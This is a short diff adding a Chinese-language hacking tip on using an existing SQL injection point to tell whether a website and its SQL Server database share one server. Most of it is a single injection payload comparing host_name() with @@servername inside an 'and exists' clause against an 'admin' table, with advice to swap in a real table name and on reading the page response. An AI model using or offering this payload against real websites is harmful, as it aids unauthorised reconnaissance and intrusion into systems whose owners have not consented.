@@ -1,0 +1,9 @@
+利用sql注入点判断网站和数据库是否站库分离
+
+在注入点后加上
+
+1.and exists(select * from admin where 1=(Select (case when host_name()=@@servername then 1 else 0 end)))  
+注意红色部分的admin一定要是存在的表段，自行发挥！
+
+如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。
+
